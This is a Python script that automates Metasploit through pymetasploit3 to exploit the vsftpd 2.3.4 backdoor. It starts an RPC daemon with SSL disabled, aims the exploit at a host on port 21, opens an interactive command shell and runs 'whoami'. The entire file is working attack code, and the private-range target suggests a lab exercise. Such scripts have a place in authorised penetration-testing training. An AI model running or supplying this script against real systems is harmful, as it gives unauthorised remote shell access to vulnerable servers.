from pymetasploit3.msfrpc import MsfRpcClient
import time
import os
import pyfiglet

banner = pyfiglet.figlet_format('Expoit FTP BACKDOOR')
print(banner)
print("=="*40)
os.system("pkill -f msfrpcd")
time.sleep(0.5)
os.system("msfrpcd -a 127.0.0.1 -S False -p 1597 -P yourpassword")
time.sleep(10.0)
# msfrpcd -a 127.0.0.1 -p 1597 -P yourpassword

## Usage example

# Connect to the RPC server
# client = MsfRpcClient('yourpassword')
client = MsfRpcClient('yourpassword', port=1597, ssl=False)
time.sleep(2.0)

# Get an exploit object
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
time.sleep(0.5)
# Set the exploit options
#exploit['RHOST'] = "192.168.115.80"
exploit['RHOSTS'] = "10.6.6.14"
exploit['RPORT'] = "21"
time.sleep(0.5)
# Execute the exploit, success will return a jobid
exploit.execute(payload="cmd/unix/interact")
time.sleep(5.0)
# Find all available sessions
print("Sessions avaiables : ")
for s in client.sessions.list.keys():
	print(s)

# Get a shell object
# print(client.sessions.list)

shell = client.sessions.session(list(client.sessions.list.keys())[0])
time.sleep(5)
# Write to the shell
shell.write('whoami')
# Print the output
print(shell.read())
time.sleep(5)
# Stop the shell
shell.stop()
